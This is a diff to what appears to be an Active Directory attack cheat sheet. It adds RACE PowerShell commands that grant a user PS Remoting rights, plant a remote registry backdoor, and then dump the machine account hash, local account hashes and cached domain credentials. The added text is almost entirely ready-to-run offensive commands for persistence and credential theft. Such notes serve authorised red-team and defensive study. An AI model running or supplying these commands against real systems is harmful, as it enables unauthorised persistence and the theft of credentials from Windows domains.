@@ -113,11 +113,26 @@ C:> . .\RACE.ps1
 C:> Set-RemoteWMI -SamAccountName <username> -ComputerName <hostname_full_FQDN> -namespace 'root\cimv2' -Verbose
 ```
 ```powershell
-# To be able to run WMI commands
+# Give permissions to be able to PS Remoting
+# UNSTABLE SINCE SOME M$ PATCHES
 C:> . .\RACE.ps1
 
 # Allow <user> WMI access in host. Domain Admin privileges shell process required
 C:> Set-RemotePSRemoting –SamAccountName <username> -ComputerName <hostname_full_FQDN> -Verbose
+```
+- **Remote Registry**
+```powershell
+# Using RACE, with admin privs on remote machine
+C:> Add-RemoteRegBackdoor -ComputerName <hostname> -Trustee <username> -Verbose
+
+# As <username> from before, retrieve machine account hash:
+C:> Get-RemoteMachineAccountHash -ComputerName <hostname> -Verbose
+
+# As <username> from before, retrieve local account hash:
+C:> Get-RemoteLocalAccountHash -ComputerName <hostname> -Verbose
+
+# As <username> from before, retrieve domain cached credentials:
+C:> Get-RemoteCachedCredential -ComputerName <hostname> -Verbose
 ```
 ### MORE
 
